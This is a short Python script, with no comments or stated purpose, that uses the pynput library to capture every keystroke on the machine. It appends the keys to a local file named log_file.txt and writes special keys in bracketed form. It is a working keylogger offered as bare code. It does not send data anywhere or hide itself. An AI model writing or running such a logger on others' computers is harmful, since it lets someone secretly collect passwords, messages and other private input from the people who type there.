from pynput.keyboard import Key, Listener

def pressKey(key):
    with open ("log_file.txt", "a") as file:
        try:
            file.write(key.char)

        except:
            if key == Key.enter:
                file.write("\n")
            elif key == Key.tab:
                file.write("\t")
            elif key == Key.space:
                file.write(" ")
            else:
                file.write(f"[{key.name}]")


with Listener(on_press=pressKey) as listener:
    listener.join()


